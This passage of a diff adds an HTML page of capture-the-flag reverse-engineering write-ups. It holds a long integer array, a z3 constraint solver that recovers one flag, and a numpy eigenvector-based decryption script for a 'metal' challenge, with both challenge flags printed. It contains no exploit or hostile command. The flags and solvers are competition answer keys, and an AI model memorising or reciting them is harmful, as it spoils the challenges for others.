+                <span class="hljs-number">2730097174</span>,
+                <span class="hljs-number">1499965472</span>,
+                <span class="hljs-number">760244614</span>,
+                <span class="hljs-number">1588114416</span>,
+                <span class="hljs-number">521516362</span>,
+                <span class="hljs-number">2963707630</span>,
+                <span class="hljs-number">1896166800</span>,
+                <span class="hljs-number">411250470</span>,
+                <span class="hljs-number">1601999958</span>,
+                <span class="hljs-number">2973942456</span>,
+                <span class="hljs-number">3027806424</span>,
+                <span class="hljs-number">1238337602</span>,
+                <span class="hljs-number">1380721280</span>,
+                <span class="hljs-number">122976200</span>,
+                <span class="hljs-number">788897864</span>,
+                <span class="hljs-number">3589391734</span>,
+                <span class="hljs-number">1987301254</span>,
+                <span class="hljs-number">1085198712</span>,
+                <span class="hljs-number">3553616586</span>,
+                <span class="hljs-number">1994354546</span>,
+                <span class="hljs-number">1684916442</span>,
+                <span class="hljs-number">2788234788</span>,
+                <span class="hljs-number">2641884090</span>,
+                <span class="hljs-number">612801768</span>,
+                <span class="hljs-number">1801824798</span>,
+                <span class="hljs-number">2019943314</span>,
+                <span class="hljs-number">3304068906</span>,
+                <span class="hljs-number">849354132</span>,
+                <span class="hljs-number">44941780</span>,
+                <span class="hljs-number">3473262708</span>,
+                <span class="hljs-number">1444837808</span>
+            ],
+            [
+                <span class="hljs-number">921974086</span>,
+                <span class="hljs-number">404262832</span>,
+                <span class="hljs-number">1353817916</span>,
+                <span class="hljs-number">764855648</span>,
+                <span class="hljs-number">2290476820</span>,
+                <span class="hljs-number">2023815980</span>,
+                <span class="hljs-number">669786172</span>,
+                <span class="hljs-number">791841140</span>,
+                <span class="hljs-number">526348842</span>,
+                <span class="hljs-number">2979022342</span>,
+                <span class="hljs-number">3656325786</span>,
+                <span class="hljs-number">1276970440</span>,
+                <span class="hljs-number">2424614726</span>,
+                <span class="hljs-number">1190814714</span>,
+                <span class="hljs-number">2804417116</span>,
+                <span class="hljs-number">3654263826</span>,
+                <span class="hljs-number">3068580996</span>,
+                <span class="hljs-number">1908493640</span>,
+                <span class="hljs-number">3101330462</span>,
+                <span class="hljs-number">792198672</span>,
+                <span class="hljs-number">1772484794</span>,
+                <span class="hljs-number">4050408722</span>,
+                <span class="hljs-number">611660842</span>,
+                <span class="hljs-number">1610808360</span>,
+                <span class="hljs-number">431629552</span>,
+                <span class="hljs-number">2319897718</span>,
+                <span class="hljs-number">3255085210</span>,
+                <span class="hljs-number">1426503472</span>,
+                <span class="hljs-number">1630566802</span>,
+                <span class="hljs-number">4241881448</span>,
+                <span class="hljs-number">1606014350</span>,
+                <span class="hljs-number">636517450</span>
+            ],
+            [
+                <span class="hljs-number">2906103140</span>,
+                <span class="hljs-number">1116553354</span>,
+                <span class="hljs-number">2279536366</span>,
+                <span class="hljs-number">3011561210</span>,
+                <span class="hljs-number">2641603848</span>,
+                <span class="hljs-number">1646150780</span>,
+                <span class="hljs-number">192124694</span>,
+                <span class="hljs-number">611421916</span>,
+                <span class="hljs-number">3416039786</span>,
+                <span class="hljs-number">4208848404</span>,
+                <span class="hljs-number">474397384</span>,
+                <span class="hljs-number">1491088256</span>,
+                <span class="hljs-number">3177553844</span>,
+                <span class="hljs-number">2042765300</span>,
+                <span class="hljs-number">1653674858</span>,
+                <span class="hljs-number">1365840538</span>,
+                <span class="hljs-number">1595225706</span>,
+                <span class="hljs-number">2705938552</span>,
+                <span class="hljs-number">3180386458</span>,
+                <span class="hljs-number">1723055560</span>,
+                <span class="hljs-number">2280421090</span>,
+                <span class="hljs-number">1241156010</span>,
+                <span class="hljs-number">3807390206</span>,
+                <span class="hljs-number">2595800854</span>,
+                <span class="hljs-number">2890507242</span>,
+                <span class="hljs-number">4068903400</span>,
+                <span class="hljs-number">3923234634</span>,
+                <span class="hljs-number">2613933834</span>,
+                <span class="hljs-number">3927909200</span>,
+                <span class="hljs-number">2149793556</span>,
+                <span class="hljs-number">3589302752</span>,
+                <span class="hljs-number">802516900</span>
+            ],
+            [
+                <span class="hljs-number">171242408</span>,
+                <span class="hljs-number">1411016272</span>,
+                <span class="hljs-number">2890085382</span>,
+                <span class="hljs-number">624162464</span>,
+                <span class="hljs-number">3117870816</span>,
+                <span class="hljs-number">3388454296</span>,
+                <span class="hljs-number">3869111620</span>,
+                <span class="hljs-number">948964384</span>,
+                <span class="hljs-number">1670102044</span>,
+                <span class="hljs-number">3432346180</span>,
+                <span class="hljs-number">1670460686</span>,
+                <span class="hljs-number">3674313702</span>,
+                <span class="hljs-number">4108083090</span>,
+                <span class="hljs-number">915550832</span>,
+                <span class="hljs-number">4249135230</span>,
+                <span class="hljs-number">411447682</span>,
+                <span class="hljs-number">2915987712</span>,
+                <span class="hljs-number">3865207952</span>,
+                <span class="hljs-number">4017666788</span>,
+                <span class="hljs-number">275767786</span>,
+                <span class="hljs-number">2506858524</span>,
+                <span class="hljs-number">3488718446</span>,
+                <span class="hljs-number">1995975410</span>,
+                <span class="hljs-number">566166116</span>,
+                <span class="hljs-number">1590333384</span>,
+                <span class="hljs-number">329205954</span>,
+                <span class="hljs-number">3913164274</span>,
+                <span class="hljs-number">620615436</span>,
+                <span class="hljs-number">1464604756</span>,
+                <span class="hljs-number">269837028</span>,
+                <span class="hljs-number">963851056</span>,
+                <span class="hljs-number">2483789524</span>
+            ],
+            [
+                <span class="hljs-number">4043184956</span>,
+                <span class="hljs-number">3569779124</span>,
+                <span class="hljs-number">3817645374</span>,
+                <span class="hljs-number">4281618348</span>,
+                <span class="hljs-number">4144074366</span>,
+                <span class="hljs-number">3776223584</span>,
+                <span class="hljs-number">2260112022</span>,
+                <span class="hljs-number">2417238210</span>,
+                <span class="hljs-number">4004384546</span>,
+                <span class="hljs-number">1196429850</span>,
+                <span class="hljs-number">1429697170</span>,
+                <span class="hljs-number">3075499898</span>,
+                <span class="hljs-number">2507660230</span>,
+                <span class="hljs-number">1342925724</span>,
+                <span class="hljs-number">3951341456</span>,
+                <span class="hljs-number">229184726</span>,
+                <span class="hljs-number">2762396986</span>,
+                <span class="hljs-number">1612961426</span>,
+                <span class="hljs-number">986238002</span>,
+                <span class="hljs-number">1228690306</span>,
+                <span class="hljs-number">3948701236</span>,
+                <span class="hljs-number">1378190546</span>,
+                <span class="hljs-number">3106898794</span>,
+                <span class="hljs-number">1894874158</span>,
+                <span class="hljs-number">1488049036</span>,
+                <span class="hljs-number">3718233910</span>,
+                <span class="hljs-number">1078939754</span>,
+                <span class="hljs-number">2355898312</span>,
+                <span class="hljs-number">2030934192</span>,
+                <span class="hljs-number">2879370894</span>,
+                <span class="hljs-number">3017715248</span>,
+                <span class="hljs-number">1647621107</span>
+            ],
+            [
+                <span class="hljs-number">3849716376</span>,
+                <span class="hljs-number">3412391848</span>,
+                <span class="hljs-number">420800182</span>,
+                <span class="hljs-number">156925722</span>,
+                <span class="hljs-number">3602232204</span>,
+                <span class="hljs-number">2645326622</span>,
+                <span class="hljs-number">3864083570</span>,
+                <span class="hljs-number">1279782822</span>,
+                <span class="hljs-number">878821008</span>,
+                <span class="hljs-number">1906288878</span>,
+                <span class="hljs-number">1396282244</span>,
+                <span class="hljs-number">1641728726</span>,
+                <span class="hljs-number">2295751090</span>,
+                <span class="hljs-number">290937256</span>,
+                <span class="hljs-number">1958396986</span>,
+                <span class="hljs-number">2115100470</span>,
+                <span class="hljs-number">3706945590</span>,
+                <span class="hljs-number">2885002942</span>,
+                <span class="hljs-number">1935777480</span>,
+                <span class="hljs-number">1483762940</span>,
+                <span class="hljs-number">3589264430</span>,
+                <span class="hljs-number">3791465274</span>,
+                <span class="hljs-number">2553819596</span>,
+                <span class="hljs-number">2050180502</span>,
+                <span class="hljs-number">1381704584</span>,
+                <span class="hljs-number">4640270</span>,
+                <span class="hljs-number">628970046</span>,
+                <span class="hljs-number">774725214</span>,
+                <span class="hljs-number">2575508070</span>,
+                <span class="hljs-number">1330692832</span>,
+                <span class="hljs-number">1250987676</span>,
+                <span class="hljs-number">3756982724</span>
+            ],
+            [
+                <span class="hljs-number">1460953346</span>,
+                <span class="hljs-number">1175847424</span>,
+                <span class="hljs-number">3477700838</span>,
+                <span class="hljs-number">3783709768</span>,
+                <span class="hljs-number">1064663570</span>,
+                <span class="hljs-number">3559971784</span>,
+                <span class="hljs-number">3802954664</span>,
+                <span class="hljs-number">2431960456</span>,
+                <span class="hljs-number">2198986400</span>,
+                <span class="hljs-number">859802318</span>,
+                <span class="hljs-number">3783810034</span>,
+                <span class="hljs-number">1110187920</span>,
+                <span class="hljs-number">4244034440</span>,
+                <span class="hljs-number">1796543058</span>,
+                <span class="hljs-number">902449590</span>,
+                <span class="hljs-number">160031782</span>,
+                <span class="hljs-number">3639253664</span>,
+                <span class="hljs-number">4255746326</span>,
+                <span class="hljs-number">3339514496</span>,
+                <span class="hljs-number">218988706</span>,
+                <span class="hljs-number">4085181614</span>,
+                <span class="hljs-number">2342973726</span>,
+                <span class="hljs-number">1391523108</span>,
+                <span class="hljs-number">1120970708</span>,
+                <span class="hljs-number">2639842372</span>,
+                <span class="hljs-number">156321138</span>,
+                <span class="hljs-number">1587974922</span>,
+                <span class="hljs-number">3686627774</span>,
+                <span class="hljs-number">1648124740</span>,
+                <span class="hljs-number">2095688044</span>,
+                <span class="hljs-number">293533614</span>,
+                <span class="hljs-number">3056924137</span>
+            ],
+            [
+                <span class="hljs-number">1034259104</span>,
+                <span class="hljs-number">4077045412</span>,
+                <span class="hljs-number">789979418</span>,
+                <span class="hljs-number">961028604</span>,
+                <span class="hljs-number">2185949320</span>,
+                <span class="hljs-number">3457364068</span>,
+                <span class="hljs-number">3532291848</span>,
+                <span class="hljs-number">2206594748</span>,
+                <span class="hljs-number">3072062072</span>,
+                <span class="hljs-number">1796530288</span>,
+                <span class="hljs-number">1402389280</span>,
+                <span class="hljs-number">3478769990</span>,
+                <span class="hljs-number">196567236</span>,
+                <span class="hljs-number">3940435298</span>,
+                <span class="hljs-number">2237679842</span>,
+                <span class="hljs-number">668941406</span>,
+                <span class="hljs-number">170819894</span>,
+                <span class="hljs-number">1102049112</span>,
+                <span class="hljs-number">131349762</span>,
+                <span class="hljs-number">2512464482</span>,
+                <span class="hljs-number">4159048294</span>,
+                <span class="hljs-number">2186098090</span>,
+                <span class="hljs-number">123947608</span>,
+                <span class="hljs-number">1742064290</span>,
+                <span class="hljs-number">1711289746</span>,
+                <span class="hljs-number">1449132362</span>,
+                <span class="hljs-number">58078952</span>,
+                <span class="hljs-number">2976574968</span>,
+                <span class="hljs-number">1774398264</span>,
+                <span class="hljs-number">1532589156</span>,
+                <span class="hljs-number">4089484268</span>,
+                <span class="hljs-number">4041979478</span>
+            ],
+            [
+                <span class="hljs-number">3681899832</span>,
+                <span class="hljs-number">4208608358</span>,
+                <span class="hljs-number">1951338724</span>,
+                <span class="hljs-number">3772673566</span>,
+                <span class="hljs-number">3160075610</span>,
+                <span class="hljs-number">1422174080</span>,
+                <span class="hljs-number">2431526454</span>,
+                <span class="hljs-number">529884656</span>,
+                <span class="hljs-number">2722748162</span>,
+                <span class="hljs-number">236192616</span>,
+                <span class="hljs-number">2684139926</span>,
+                <span class="hljs-number">697549902</span>,
+                <span class="hljs-number">3546454434</span>,
+                <span class="hljs-number">1921398338</span>,
+                <span class="hljs-number">1310272304</span>,
+                <span class="hljs-number">1691292498</span>,
+                <span class="hljs-number">4134700116</span>,
+                <span class="hljs-number">720619430</span>,
+                <span class="hljs-number">2592536546</span>,
+                <span class="hljs-number">2188997288</span>,
+                <span class="hljs-number">2461521148</span>,
+                <span class="hljs-number">455077540</span>,
+                <span class="hljs-number">1421274126</span>,
+                <span class="hljs-number">1052585740</span>,
+                <span class="hljs-number">2383754190</span>,
+                <span class="hljs-number">1567602170</span>,
+                <span class="hljs-number">3773864138</span>,
+                <span class="hljs-number">4036579298</span>,
+                <span class="hljs-number">2416620860</span>,
+                <span class="hljs-number">1931099884</span>,
+                <span class="hljs-number">2051263696</span>,
+                <span class="hljs-number">310763286</span>
+            ],
+            [
+                <span class="hljs-number">1461705722</span>,
+                <span class="hljs-number">968835462</span>,
+                <span class="hljs-number">2563821358</span>,
+                <span class="hljs-number">576185928</span>,
+                <span class="hljs-number">1613137824</span>,
+                <span class="hljs-number">940353300</span>,
+                <span class="hljs-number">652295412</span>,
+                <span class="hljs-number">1135005196</span>,
+                <span class="hljs-number">3607866196</span>,
+                <span class="hljs-number">3307698550</span>,
+                <span class="hljs-number">3916080186</span>,
+                <span class="hljs-number">4052934590</span>,
+                <span class="hljs-number">3991167852</span>,
+                <span class="hljs-number">3799175976</span>,
+                <span class="hljs-number">3393348946</span>,
+                <span class="hljs-number">950814766</span>,
+                <span class="hljs-number">2174463160</span>,
+                <span class="hljs-number">2422320256</span>,
+                <span class="hljs-number">959545514</span>,
+                <span class="hljs-number">2820210140</span>,
+                <span class="hljs-number">4284041840</span>,
+                <span class="hljs-number">3082466322</span>,
+                <span class="hljs-number">1257510060</span>,
+                <span class="hljs-number">2676710840</span>,
+                <span class="hljs-number">127465314</span>,
+                <span class="hljs-number">3887977956</span>,
+                <span class="hljs-number">3218198116</span>,
+                <span class="hljs-number">957094088</span>,
+                <span class="hljs-number">1409365960</span>,
+                <span class="hljs-number">2217798938</span>,
+                <span class="hljs-number">277108032</span>,
+                <span class="hljs-number">2579736592</span>
+            ],
+            [
+                <span class="hljs-number">3776055232</span>,
+                <span class="hljs-number">823459706</span>,
+                <span class="hljs-number">1913270776</span>,
+                <span class="hljs-number">1721511850</span>,
+                <span class="hljs-number">633354432</span>,
+                <span class="hljs-number">3901765934</span>,
+                <span class="hljs-number">2089017122</span>,
+                <span class="hljs-number">1103648570</span>,
+                <span class="hljs-number">3791238880</span>,
+                <span class="hljs-number">1686042442</span>,
+                <span class="hljs-number">1567720048</span>,
+                <span class="hljs-number">2924815412</span>,
+                <span class="hljs-number">1695861754</span>,
+                <span class="hljs-number">3641036796</span>,
+                <span class="hljs-number">1208391908</span>,
+                <span class="hljs-number">1593134050</span>,
+                <span class="hljs-number">1674288590</span>,
+                <span class="hljs-number">2322785248</span>,
+                <span class="hljs-number">2472109738</span>,
+                <span class="hljs-number">3572933674</span>,
+                <span class="hljs-number">3828029068</span>,
+                <span class="hljs-number">1641647380</span>,
+                <span class="hljs-number">4116180236</span>,
+                <span class="hljs-number">3884220004</span>,
+                <span class="hljs-number">3146594508</span>,
+                <span class="hljs-number">3587030908</span>,
+                <span class="hljs-number">3451856524</span>,
+                <span class="hljs-number">2965945264</span>,
+                <span class="hljs-number">162291656</span>,
+                <span class="hljs-number">2061732942</span>,
+                <span class="hljs-number">1551591510</span>,
+                <span class="hljs-number">4014200221</span>
+            ],
+            [
+                <span class="hljs-number">3406794856</span>,
+                <span class="hljs-number">3181753846</span>,
+                <span class="hljs-number">2984888850</span>,
+                <span class="hljs-number">1748566984</span>,
+                <span class="hljs-number">1311737108</span>,
+                <span class="hljs-number">3415409722</span>,
+                <span class="hljs-number">2398926736</span>,
+                <span class="hljs-number">2006269026</span>,
+                <span class="hljs-number">3117725174</span>,
+                <span class="hljs-number">2901254050</span>,
+                <span class="hljs-number">2733703362</span>,
+                <span class="hljs-number">1595001962</span>,
+                <span class="hljs-number">106879068</span>,
+                <span class="hljs-number">3933136528</span>,
+                <span class="hljs-number">245096038</span>,
+                <span class="hljs-number">666024082</span>,
+                <span class="hljs-number">134803296</span>,
+                <span class="hljs-number">1657783988</span>,
+                <span class="hljs-number">3429228290</span>,
+                <span class="hljs-number">2120419114</span>,
+                <span class="hljs-number">2879013028</span>,
+                <span class="hljs-number">9653606</span>,
+                <span class="hljs-number">305704628</span>,
+                <span class="hljs-number">3793128986</span>,
+                <span class="hljs-number">369835124</span>,
+                <span class="hljs-number">2274924880</span>,
+                <span class="hljs-number">4233339440</span>,
+                <span class="hljs-number">2224753480</span>,
+                <span class="hljs-number">2427854922</span>,
+                <span class="hljs-number">1808326540</span>,
+                <span class="hljs-number">1833703938</span>,
+                <span class="hljs-number">2391461119</span>
+            ],
+            [
+                <span class="hljs-number">1827597388</span>,
+                <span class="hljs-number">454565514</span>,
+                <span class="hljs-number">1282880792</span>,
+                <span class="hljs-number">561174442</span>,
+                <span class="hljs-number">3610484436</span>,
+                <span class="hljs-number">2327669348</span>,
+                <span class="hljs-number">765794442</span>,
+                <span class="hljs-number">3705161518</span>,
+                <span class="hljs-number">1715916192</span>,
+                <span class="hljs-number">292859360</span>,
+                <span class="hljs-number">183730846</span>,
+                <span class="hljs-number">3298097994</span>,
+                <span class="hljs-number">3535037218</span>,
+                <span class="hljs-number">2904849282</span>,
+                <span class="hljs-number">348832662</span>,
+                <span class="hljs-number">1856773750</span>,
+                <span class="hljs-number">3618335118</span>,
+                <span class="hljs-number">3017093112</span>,
+                <span class="hljs-number">3354956190</span>,
+                <span class="hljs-number">3208811970</span>,
+                <span class="hljs-number">897522204</span>,
+                <span class="hljs-number">2835584374</span>,
+                <span class="hljs-number">3097985334</span>,
+                <span class="hljs-number">2108903166</span>,
+                <span class="hljs-number">3230714490</span>,
+                <span class="hljs-number">2597789348</span>,
+                <span class="hljs-number">1597521406</span>,
+                <span class="hljs-number">1663858876</span>,
+                <span class="hljs-number">94923994</span>,
+                <span class="hljs-number">883872856</span>,
+                <span class="hljs-number">3230397040</span>,
+                <span class="hljs-number">3420763893</span>
+            ],
+            [
+                <span class="hljs-number">4065160224</span>,
+                <span class="hljs-number">2129787468</span>,
+                <span class="hljs-number">3456903512</span>,
+                <span class="hljs-number">2860656238</span>,
+                <span class="hljs-number">2663588170</span>,
+                <span class="hljs-number">3224900102</span>,
+                <span class="hljs-number">2827778318</span>,
+                <span class="hljs-number">2685874320</span>,
+                <span class="hljs-number">2005737334</span>,
+                <span class="hljs-number">586304716</span>,
+                <span class="hljs-number">472376412</span>,
+                <span class="hljs-number">2938324550</span>,
+                <span class="hljs-number">3459137716</span>,
+                <span class="hljs-number">3422216092</span>,
+                <span class="hljs-number">3082124658</span>,
+                <span class="hljs-number">1173945064</span>,
+                <span class="hljs-number">842495374</span>,
+                <span class="hljs-number">2564495050</span>,
+                <span class="hljs-number">357433170</span>,
+                <span class="hljs-number">2050324102</span>,
+                <span class="hljs-number">1138367532</span>,
+                <span class="hljs-number">854845936</span>,
+                <span class="hljs-number">3054001576</span>,
+                <span class="hljs-number">2465772674</span>,
+                <span class="hljs-number">2305389082</span>,
+                <span class="hljs-number">3669610606</span>,
+                <span class="hljs-number">3527889292</span>,
+                <span class="hljs-number">3817664802</span>,
+                <span class="hljs-number">4238531160</span>,
+                <span class="hljs-number">1556372762</span>,
+                <span class="hljs-number">777986002</span>,
+                <span class="hljs-number">1126454981</span>
+            ],
+            [
+                <span class="hljs-number">764733144</span>,
+                <span class="hljs-number">3965849612</span>,
+                <span class="hljs-number">1668893328</span>,
+                <span class="hljs-number">2104626056</span>,
+                <span class="hljs-number">1653642872</span>,
+                <span class="hljs-number">2883395356</span>,
+                <span class="hljs-number">3015268318</span>,
+                <span class="hljs-number">2322404760</span>,
+                <span class="hljs-number">1185726976</span>,
+                <span class="hljs-number">1607036694</span>,
+                <span class="hljs-number">3064704530</span>,
+                <span class="hljs-number">3639372768</span>,
+                <span class="hljs-number">1252489394</span>,
+                <span class="hljs-number">3950622630</span>,
+                <span class="hljs-number">3889240956</span>,
+                <span class="hljs-number">233990458</span>,
+                <span class="hljs-number">2393973872</span>,
+                <span class="hljs-number">3609439896</span>,
+                <span class="hljs-number">2108036182</span>,
+                <span class="hljs-number">152726882</span>,
+                <span class="hljs-number">3730671578</span>,
+                <span class="hljs-number">3038534682</span>,
+                <span class="hljs-number">3388044150</span>,
+                <span class="hljs-number">3128791454</span>,
+                <span class="hljs-number">2499312664</span>,
+                <span class="hljs-number">3396894570</span>,
+                <span class="hljs-number">2872225186</span>,
+                <span class="hljs-number">3048419004</span>,
+                <span class="hljs-number">2864782986</span>,
+                <span class="hljs-number">3169897264</span>,
+                <span class="hljs-number">2890258816</span>,
+                <span class="hljs-number">753842003</span>
+            ],
+            [
+                <span class="hljs-number">2403595118</span>,
+                <span class="hljs-number">2093259638</span>,
+                <span class="hljs-number">2763900156</span>,
+                <span class="hljs-number">3772789760</span>,
+                <span class="hljs-number">3282639530</span>,
+                <span class="hljs-number">2884294140</span>,
+                <span class="hljs-number">3879894514</span>,
+                <span class="hljs-number">2512089226</span>,
+                <span class="hljs-number">318451120</span>,
+                <span class="hljs-number">2464691316</span>,
+                <span class="hljs-number">2179668204</span>,
+                <span class="hljs-number">795049786</span>,
+                <span class="hljs-number">326585310</span>,
+                <span class="hljs-number">1313213364</span>,
+                <span class="hljs-number">3437852224</span>,
+                <span class="hljs-number">4055872768</span>,
+                <span class="hljs-number">1224395344</span>,
+                <span class="hljs-number">1911910472</span>,
+                <span class="hljs-number">983774674</span>,
+                <span class="hljs-number">3804144712</span>,
+                <span class="hljs-number">3208317764</span>,
+                <span class="hljs-number">1534290234</span>,
+                <span class="hljs-number">3243577720</span>,
+                <span class="hljs-number">617743358</span>,
+                <span class="hljs-number">378252266</span>,
+                <span class="hljs-number">3612369740</span>,
+                <span class="hljs-number">1924240610</span>,
+                <span class="hljs-number">961715850</span>,
+                <span class="hljs-number">2058485164</span>,
+                <span class="hljs-number">1460892148</span>,
+                <span class="hljs-number">2613095898</span>,
+                <span class="hljs-number">73199927</span>
+            ],
+            [
+                <span class="hljs-number">3093631524</span>,
+                <span class="hljs-number">2704600210</span>,
+                <span class="hljs-number">3519611266</span>,
+                <span class="hljs-number">5414320</span>,
+                <span class="hljs-number">3358912704</span>,
+                <span class="hljs-number">2462642760</span>,
+                <span class="hljs-number">3764896542</span>,
+                <span class="hljs-number">1253645320</span>,
+                <span class="hljs-number">4034052234</span>,
+                <span class="hljs-number">3137650284</span>,
+                <span class="hljs-number">4083324920</span>,
+                <span class="hljs-number">2667059126</span>,
+                <span class="hljs-number">436316958</span>,
+                <span class="hljs-number">497182460</span>,
+                <span class="hljs-number">404768030</span>,
+                <span class="hljs-number">1122443700</span>,
+                <span class="hljs-number">432434942</span>,
+                <span class="hljs-number">443290780</span>,
+                <span class="hljs-number">3487257114</span>,
+                <span class="hljs-number">2699955512</span>,
+                <span class="hljs-number">4250049274</span>,
+                <span class="hljs-number">3991832458</span>,
+                <span class="hljs-number">1037538700</span>,
+                <span class="hljs-number">3125332984</span>,
+                <span class="hljs-number">1533312690</span>,
+                <span class="hljs-number">1452437348</span>,
+                <span class="hljs-number">1283257518</span>,
+                <span class="hljs-number">3946567854</span>,
+                <span class="hljs-number">716640500</span>,
+                <span class="hljs-number">2417637998</span>,
+                <span class="hljs-number">3063327834</span>,
+                <span class="hljs-number">82885668</span>
+            ],
+            [
+                <span class="hljs-number">1985108</span>,
+                <span class="hljs-number">1694522756</span>,
+                <span class="hljs-number">4205785758</span>,
+                <span class="hljs-number">333118606</span>,
+                <span class="hljs-number">2944637686</span>,
+                <span class="hljs-number">2196892858</span>,
+                <span class="hljs-number">4092971632</span>,
+                <span class="hljs-number">83374602</span>,
+                <span class="hljs-number">4049383084</span>,
+                <span class="hljs-number">2980843496</span>,
+                <span class="hljs-number">1801648602</span>,
+                <span class="hljs-number">2639009750</span>,
+                <span class="hljs-number">1944350566</span>,
+                <span class="hljs-number">3046229260</span>,
+                <span class="hljs-number">2662687100</span>,
+                <span class="hljs-number">2423732014</span>,
+                <span class="hljs-number">4179240348</span>,
+                <span class="hljs-number">1035280058</span>,
+                <span class="hljs-number">1015236846</span>,
+                <span class="hljs-number">3488976898</span>,
+                <span class="hljs-number">1530833166</span>,
+                <span class="hljs-number">3723596058</span>,
+                <span class="hljs-number">4125718292</span>,
+                <span class="hljs-number">1095267878</span>,
+                <span class="hljs-number">3635353922</span>,
+                <span class="hljs-number">2932904358</span>,
+                <span class="hljs-number">2764606674</span>,
+                <span class="hljs-number">45921060</span>,
+                <span class="hljs-number">3107074868</span>,
+                <span class="hljs-number">4198045636</span>,
+                <span class="hljs-number">1923836480</span>,
+                <span class="hljs-number">366302822</span>
+            ]
+
+]
+def pp(num,i):
+  q = <span class="hljs-number">1</span>
+  for t in range(i):
+    q*=num
+  return q
+def calc(a,num):
+  re = <span class="hljs-number">0</span>
+  for i in range(len(a)):
+    re += a[i] * pp(num,i)
+  return re
+flag = ""
+for a in aaa:
+  s = Solver()
+  ff = BitVec("flag",<span class="hljs-number">32</span>)
+  num = <span class="hljs-number">0</span>xffffffff
+  print a[:-<span class="hljs-number">1</span>]
+  for i in range(<span class="hljs-number">35</span>):
+    print i
+    num=calc([ff]+a[:-<span class="hljs-number">1</span>],num) 
+  s.add(num == a[-<span class="hljs-number">1</span>])
+  print s.check()
+  print s.model()
+  f = s.model()[ff].as_long()
+  flag += hex(f)[<span class="hljs-number">2</span>:].decode("hex")[::-<span class="hljs-number">1</span>]
+  print flag
+</code></pre><ol start="4">
+<li>flag = <code>TWCTF{Xm4r1n_15_4bl3_70_6en3r4t3_N471v3_C0d3_w17h_VS_3n73rpr153_bu7_17_c0n741n5_D07_N3t_B1n4ry}</code><h3 id="metal"><a class="header-link" href="#metal"></a>metal</h3>
+<h4 id="tl;dr-1"><a class="header-link" href="#tl;dr-1"></a>TL;DR</h4>
+</li>
+<li>Disassemble the cisa binary file to visa asm.</li>
+<li>Cleanup the syntax.</li>
+<li>Manually decompiled it to pseudo code.</li>
+<li>Construct the eigenvector (i.e. key) from eigenvalues.</li>
+</ol>
+<p>Full writeup is at <a href="https://sasdf.github.io/ctf/writeup/2020/tokyoWesterns/rev/metal/">here</a>.</p>
+<h4 id="decryption-script"><a class="header-link" href="#decryption-script"></a>Decryption script</h4>
+<pre class="hljs"><code><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
+
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">'flag.enc'</span>, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:
+    data = f.read()
+
+data = np.frombuffer(data, dtype=np.double).reshape(<span class="hljs-number">-1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>)
+
+flag = <span class="hljs-string">b''</span>
+<span class="hljs-keyword">for</span> diag, enc <span class="hljs-keyword">in</span> data:
+    LA = diag[<span class="hljs-number">0</span>]
+    LM = diag[<span class="hljs-number">1</span>:].reshape(<span class="hljs-number">8</span>, <span class="hljs-number">7</span>)
+
+    V = np.zeros_like(enc)
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):
+        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):
+            lhs = np.sum(np.log(np.abs(LA[i] - np.concatenate([LA[:i], LA[i+<span class="hljs-number">1</span>:]]))))
+            rhs = np.sum(np.log(np.abs(LA[i] - LM[j])))
+            V[i,j] = np.exp((rhs - lhs) / <span class="hljs-number">2</span>)
+
+    dec = enc / V
+    flag += np.round(dec).astype(np.uint8).tobytes()
+
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">'flag.png'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> f:
+    f.write(flag)
+
+<span class="hljs-comment">#TWCTF{Is_it_possible_to_get_the_eigenvectors_of_a_matrix_using_only_its_eigenvalues?}</span>
+</code></pre>        </article>
+      </div>
+    </div>
+  </body>
+</html>
